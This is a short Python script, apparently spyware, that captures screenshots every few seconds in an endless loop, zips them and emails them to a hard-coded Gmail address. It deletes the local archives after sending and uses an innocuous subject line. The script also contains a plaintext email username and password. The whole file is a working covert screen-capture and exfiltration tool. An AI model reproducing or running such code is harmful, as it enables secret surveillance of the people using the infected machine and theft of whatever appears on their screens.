#!/usr/bin/env python
# -*- coding: utf-8 -*-
# filename: AutoCollection.py

import sys
sys.path.append("..\lib")

import time
import os
import threading
import thread

import screenshot
import winrar
import sendmail
import my_zipfile

DST_LIST = ("idsinglefunny@gmail.com", )
SRC_LIST = ("test@test.net")
SUBJECT  = "Re: Re: Re: [MISC]©зд╬"
CONTENT  = "CT"
ATT      = r"E:\task\Mail\d.htm"

def rar_and_send():
    time_stamp  = time.strftime('%Y-%m-%d-%H-%M-%S', time.localtime(time.time()))
    file_name   = time_stamp+".ct"
    abs_path    = os.path.abspath("..")
    abs_rar     = os.path.join(abs_path, "to_send")
    abs_img     = os.path.join(abs_path, "img")
    rar_file    = abs_rar + "\\" + file_name

    my_zipfile.zip_dir(abs_img, rar_file)
    if os.path.isfile(rar_file):
        my = sendmail.SendMail(DST_LIST, SRC_LIST)
        my.add_subject(time_stamp)
        my.add_content(CONTENT)
        my.add_attch(rar_file)
        # print my.mail
        my.send_mail("smtp.gmail.com", "idsinglefunny", "id1t2j3k")
        # print rar_file
        os.remove(rar_file)
        # print "sending......"
        return True
    else:
        return False
    
def auto_collection():
    # rar_thred = threading.Thread(target=rar_and_send)
    # rar_thred.start()
    
    abs_path    = os.path.abspath("..")
    abs_img     = os.path.join(abs_path, "img")
    abs_rar     = os.path.join(abs_path, "to_send")
    
    for deleted_file in os.listdir(abs_rar):
        os.remove(os.path.join(abs_rar, deleted_file))
    
    thread.start_new_thread(rar_and_send, ())
    
    while True:
        for i in range(3):
            screenshot.save_screen(abs_img, img_format="jpg")
            time.sleep(5)
        thread.start_new_thread(rar_and_send, ())
        
if __name__ == "__main__":
    # time.sleep(180)
    auto_collection()